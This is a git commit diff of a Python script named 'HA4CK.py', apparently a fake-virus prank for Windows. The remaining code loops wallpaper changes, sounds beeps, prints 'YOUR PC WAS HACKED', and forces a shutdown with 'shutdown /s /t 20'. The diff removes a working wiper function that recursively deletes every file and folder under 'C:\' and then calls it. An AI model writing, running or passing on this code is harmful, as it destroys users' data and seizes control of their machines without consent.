f8a680a7fed25cdd47e3f991978f3c8dc2dae93e
rx550x <150556636+HOSAM-ALOMARI@users.noreply.github.com>
2024-12-28 20:41:22 +0300

    Add files via upload

--- HA4CK.py
+++ HA4CK.py
@@ -6,9 +6,6 @@ import winsound
 import subprocess
 
 def change_wallpaper(image_path):
-    if not os.path.exists(image_path):
-        return
-
     try:
         ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
         for _ in range(1000): 
@@ -18,39 +15,17 @@ def change_wallpaper(image_path):
         show_message("Error", f"Failed to change wallpaper: {e}")
         
 def shutdown_pc():
-    winsound.Beep(11111, 100000)  
-    winsound.Beep(7000, 100000)  
+    winsound.Beep(1000, 500)  
+    winsound.Beep(1500, 500)
     print("YOUR PC WAS HACKED LOL HAHAH")
-    subprocess.run("shutdown /s /t 20", shell=True) 
+    subprocess.run("shutdown /s /t 20", shell=True)
+
 def show_message(title, message):
     root = tk.Tk()
     root.withdraw()  
-    messagebox.showerror(title, message) 
+    messagebox.showerror(title, message)
 
-image_path = "C:\Users\WDAGUtilityAccount\Downloads\FAKE-VIRUS-main (3).zip\FAKE-VIRUS-main/" 
+image_path = "d:\\download\\wallpaperflare.com_wallpaper (2).jpg"  
 
 change_wallpaper(image_path)
 shutdown_pc()
-import os
-import shutil
-
-def delete_all_files(directory):
-    for foldername, subfolders, filenames in os.walk(directory, topdown=False):
-        for filename in filenames:
-            try:
-                file_path = os.path.join(foldername, filename)
-                os.remove(file_path)
-                print(f"Deleted file: {file_path}")
-            except Exception as e:
-                print(f"Failed to delete {file_path}: {e}")
-
-        for subfolder in subfolders:
-            try:
-                folder_path = os.path.join(foldername, subfolder)
-                shutil.rmtree(folder_path)
-                print(f"Deleted folder: {folder_path}")
-            except Exception as e:
-                print(f"Failed to delete {folder_path}: {e}")
-
-
-delete_all_files("C:\\")
